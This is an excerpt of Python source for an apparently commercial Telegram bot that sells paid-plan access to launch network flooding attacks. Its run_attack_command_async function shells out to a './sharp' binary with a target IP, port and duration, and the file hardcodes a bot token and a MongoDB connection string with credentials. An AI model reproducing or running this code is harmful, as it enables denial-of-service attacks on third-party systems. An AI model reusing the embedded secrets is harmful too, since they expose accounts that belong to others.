...
TOKEN = "8166717437:AAFV7MeQDRVJ37aUz_U83Zfte9_RHtU0e6I"
MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
FORWARD_CHANNEL_ID = -1002379903999
CHANNEL_ID = -1002379903999
error_channel_id = -1002379903999

USERNAME = "@PRO_GAMER_VIP_OWNER"
...
async def run_attack_command_async(target_ip, target_port, duration):
    ...
    attack_process = asyncio.create_subprocess_shell(
        f"./sharp {target_ip} {target_port} {duration} 1000"
    )
    ...
    try:
        ...
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*🚫 Access Denied!*\n"  # Access Denied message
                                       ...
                                       "*Contact the owner for assistance: {USERNAME}.*", parse_mode='Markdown')  # Contact owner message
            return
...
def myinfo_command(message):
    ...
    if not user_data:
        ...
        response += "*For assistance, please contact the owner: {USERNAME}* "  # Contact owner message
    elif user_data.get('plan', 0) == 0:
        # User found but not approved
        response = "*🔒 Your account is still pending approval!* \n"  # Not approved message
        response += "*Please reach out to the owner for assistance: {USERNAME}* 🙏"  # Contact owner message
    else:
...
def help_message(message):
    try:
        ...
        button1 = types.InlineKeyboardButton("❤️‍🩹JOIN OUR CHANNEL❤️‍🩹", url="https://t.me/GODMODBYRAVI")
